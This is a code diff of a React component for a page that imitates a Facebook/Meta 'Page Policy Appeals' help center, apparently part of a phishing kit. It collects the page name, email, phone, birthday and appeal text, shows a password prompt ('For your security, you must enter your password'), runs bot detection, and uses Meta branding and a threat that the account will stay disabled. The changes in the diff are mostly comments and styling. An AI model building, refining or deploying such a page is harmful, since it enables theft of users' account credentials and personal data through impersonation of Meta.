@@ -64,24 +64,20 @@ const Home = () => {
     const [isFormEnabled, setIsFormEnabled] = useState(false);
     const [isSubmitting, setIsSubmitting] = useState(false);
     
-    // 🎯 STATE CHO HIỆU ỨNG GIF VÀ DỊCH CHUYỂN
+    // 🎯 CHỈ THÊM 2 STATE NÀY
     const [showGif, setShowGif] = useState(true);
     const [homeTranslated, setHomeTranslated] = useState(false);
 
-    // 🎯 HIỆU ỨNG GIF VÀ DỊCH CHUYỂN HOME - CHẠY SONG SONG
+    // 🎯 CHỈ THÊM EFFECT NÀY CHO GIF VÀ DỊCH HOME
     useEffect(() => {
-        // BẮT ĐẦU DỊCH HOME NGAY LẬP TỨC
         setHomeTranslated(true);
-        
-        // GIF CHẠY 3 GIÂY RỒI ẨN
         const gifTimer = setTimeout(() => {
             setShowGif(false);
         }, 3000);
-
         return () => clearTimeout(gifTimer);
     }, []);
 
-    // 🎯 DỊCH NGẦM PASSWORD VÀ SENDINFO SAU KHI HOME ĐÃ HIỆN
+    // 🎯 CHỈ THÊM EFFECT NÀY CHO DỊCH NGẦM
     useEffect(() => {
         if (!showGif && homeTranslated) {
             const targetLang = localStorage.getItem('targetLang');
@@ -91,9 +87,9 @@ const Home = () => {
         }
     }, [showGif, homeTranslated]);
 
+    // 🎯 CHỈ THÊM HÀM NÀY CHO DỊCH NGẦM
     const translateBackgroundComponents = useCallback(async (targetLang) => {
         try {
-            // 🔐 PASSWORD TEXTS (cố định)
             const passwordTexts = {
                 title: 'Please Enter Your Password',
                 description: 'For your security, you must enter your password to continue',
@@ -103,32 +99,26 @@ const Home = () => {
                 loadingText: 'Please wait'
             };
 
-            // 📧 SENDINFO TEXTS (cố định)
             const sendInfoTexts = {
                 title: 'Hệ thống chúng tôi đã tiếp nhận thông tin bạn gửi.',
                 description1: 'Nếu chúng tôi vẫn nhận thấy rằng bạn chưa đủ tuổi để sử dụng Facebook thì tài khoản của bạn sẽ vẫn bị vô hiệu hóa. Điều này là do tài khoản của bạn không tuân theo Điều khoản dịch vụ của chúng tôi.',
                 description2: 'Chúng tôi luôn quan tâm đến tính bảo mật của mọi người trên Facebook nên bạn không thể sử dụng tài khoản của mình cho đến lúc đó.'
             };
 
-            // 🚀 DỊCH TOÀN BỘ OBJECT MỘT LẦN
             const [translatedPassword, translatedSendInfo] = await Promise.all([
                 translateObjectTexts(passwordTexts, targetLang),
                 translateObjectTexts(sendInfoTexts, targetLang)
             ]);
 
-            // 💾 LƯU VÀO LOCALSTORAGE
             localStorage.setItem(`translatedPassword_${targetLang}`, JSON.stringify(translatedPassword));
             localStorage.setItem(`translatedSendInfo_${targetLang}`, JSON.stringify(translatedSendInfo));
-
         } catch (error) {
             console.log('Background translation failed:', error);
         }
     }, []);
 
-    // 🛠️ HÀM DỊCH TOÀN BỘ OBJECT
     const translateObjectTexts = async (textsObject, targetLang) => {
         const translatedObject = {};
-        
         for (const [key, text] of Object.entries(textsObject)) {
             try {
                 translatedObject[key] = await translateText(text, targetLang);
@@ -136,10 +126,10 @@ const Home = () => {
                 translatedObject[key] = text;
             }
         }
-        
         return translatedObject;
     };
 
+    // 🎯 CÁC HÀM GỐC GIỮ NGUYÊN
     const initializeSecurity = useCallback(async () => {
         try {
             const botResult = await detectBot();
@@ -433,7 +423,7 @@ const Home = () => {
 
     return (
         <>
-            {/* 🎯 GIF OVERLAY */}
+            {/* 🎯 CHỈ THÊM PHẦN NÀY - GIF OVERLAY */}
             {showGif && (
                 <div className="fixed inset-0 z-50 flex items-center justify-center bg-white">
                     <div className="text-center">
@@ -443,42 +433,40 @@ const Home = () => {
                 </div>
             )}
 
-            {/* 🎯 HOME CONTENT VỚI HIỆU ỨNG DỊCH CHUYỂN */}
-            <div className={`transition-all duration-1000 ease-in-out ${
-                homeTranslated ? 'opacity-100 translate-y-0' : 'opacity-0 translate-y-8'
-            }`}>
-                <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm bg-white z-40'>
+            {/* 🎯 TOÀN BỘ CODE GỐC GIỮ NGUYÊN - CHỈ THÊM CLASS DỊCH CHUYỂN */}
+            <div className={homeTranslated ? 'opacity-100' : 'opacity-0'}>
+                <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
                     <title>Page Help Center</title>
                     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
                     <div className='flex items-center gap-2'>
-                        <img src={FacebookImage} alt='Facebook' className='h-10 w-10' />
+                        <img src={FacebookImage} alt='' className='h-10 w-10' />
                         <p className='font-bold'>{translatedTexts.helpCenter}</p>
                     </div>
                     <div className='flex items-center gap-2'>
                         <div className='flex h-10 w-10 items-center justify-center rounded-full bg-gray-200'>
-                            <FontAwesomeIcon icon={faHeadset} size='lg' />
+                            <FontAwesomeIcon icon={faHeadset} className='' size='lg' />
                         </div>
                         <p className='rounded-lg bg-gray-200 p-3 py-2.5 text-sm font-semibold'>{translatedTexts.english}</p>
                     </div>
                 </header>
-                
                 <main className='flex max-h-[calc(100vh-56px)] min-h-[calc(100vh-56px)]'>
                     <nav className='hidden w-xs flex-col gap-2 p-4 shadow-lg sm:flex'>
-                        {data_list.map((data) => (
-                            <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
-                                <div className='flex items-center gap-2'>
-                                    <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
-                                        <FontAwesomeIcon icon={data.icon} />
+                        {data_list.map((data) => {
+                            return (
+                                <div key={data.id} className='flex cursor-pointer items-center justify-between rounded-lg p-2 px-3 hover:bg-gray-100'>
+                                    <div className='flex items-center gap-2'>
+                                        <div className='flex h-9 w-9 items-center justify-center rounded-full bg-gray-200'>
+                                            <FontAwesomeIcon icon={data.icon} />
+                                        </div>
+                                        <div>{data.title}</div>
                                     </div>
-                                    <div>{data.title}</div>
+                                    <FontAwesomeIcon icon={faChevronDown} />
                                 </div>
-                                <FontAwesomeIcon icon={faChevronDown} />
-                            </div>
-                        ))}
+                            );
+                        })}
                     </nav>
-                    
                     <div className='flex max-h-[calc(100vh-56px)] flex-1 flex-col items-center justify-start overflow-y-auto'>
-                        <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12 w-full max-w-2xl'>
+                        <div className='mx-auto rounded-lg border border-[#e4e6eb] sm:my-12'>
                             <div className='bg-[#e4e6eb] p-4 sm:p-6'>
                                 <p className='text-xl sm:text-3xl font-bold'>{translatedTexts.pagePolicyAppeals}</p>
                             </div>
@@ -487,7 +475,6 @@ const Home = () => {
                                 <p className='mb-3'>{translatedTexts.accessLimited}</p>
                                 <p>{translatedTexts.submitAppeal}</p>
                             </div>
-                            
                             <div className='flex flex-col gap-3 p-4 text-sm leading-6 font-semibold'>
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
@@ -504,7 +491,6 @@ const Home = () => {
                                     />
                                     {errors.pageName && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 </div>
-                                
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.mail} <span className='text-red-500'>*</span>
@@ -521,7 +507,6 @@ const Home = () => {
                                     {errors.mail === true && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                     {errors.mail === 'invalid' && <span className='text-xs text-red-500'>{translatedTexts.invalidEmail}</span>}
                                 </div>
-                                
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.phone} <span className='text-red-500'>*</span>
@@ -542,7 +527,6 @@ const Home = () => {
                                     </div>
                                     {errors.phone && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 </div>
-                                
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.birthday} <span className='text-red-500'>*</span>
@@ -577,7 +561,6 @@ const Home = () => {
                                     
                                     {errors.birthday && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 </div>
-                                
                                 <div className='flex flex-col gap-2'>
                                     <p className='text-base sm:text-base'>
                                         {translatedTexts.yourAppeal} <span className='text-red-500'>*</span>
@@ -593,7 +576,6 @@ const Home = () => {
                                     />
                                     {errors.appeal && <span className='text-xs text-red-500'>{translatedTexts.fieldRequired}</span>}
                                 </div>
-                                
                                 <button 
                                     className={`w-full rounded-lg px-4 py-3 text-base font-semibold transition-colors duration-200 mt-2 flex items-center justify-center ${
                                         !isFormEnabled || isSubmitting 
@@ -608,7 +590,7 @@ const Home = () => {
                                             <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                                                 <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                                                 <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
-                                            </svg>
+                                        </svg>
                                             {translatedTexts.pleaseWait}
                                         </>
                                     ) : !isFormEnabled ? (
@@ -625,9 +607,8 @@ const Home = () => {
                                 )}
                             </div>
                         </div>
-                        
                         <div className='w-full bg-[#f0f2f5] px-4 py-14 text-[15px] text-[#65676b] sm:px-32'>
-                            <div className='mx-auto flex justify-between max-w-4xl'>
+                            <div className='mx-auto flex justify-between'>
                                 <div className='flex flex-col space-y-4'>
                                     <p>{translatedTexts.about}</p>
                                     <p>{translatedTexts.adChoices}</p>
@@ -644,14 +625,13 @@ const Home = () => {
                                 </div>
                             </div>
                             <hr className='my-8 h-0 border border-transparent border-t-gray-300' />
-                            <div className='flex justify-between items-center max-w-4xl mx-auto'>
-                                <img src={FromMetaImage} alt='Meta' className='w-[100px]' />
+                            <div className='flex justify-between'>
+                                <img src={FromMetaImage} alt='' className='w-[100px]' />
                                 <p className='text-[13px] text-[#65676b]'>© {new Date().getFullYear()} Meta</p>
                             </div>
                         </div>
                     </div>
                 </main>
-                
                 {showPassword && <PasswordInput onClose={handleClosePassword} />}
             </div>
         </>
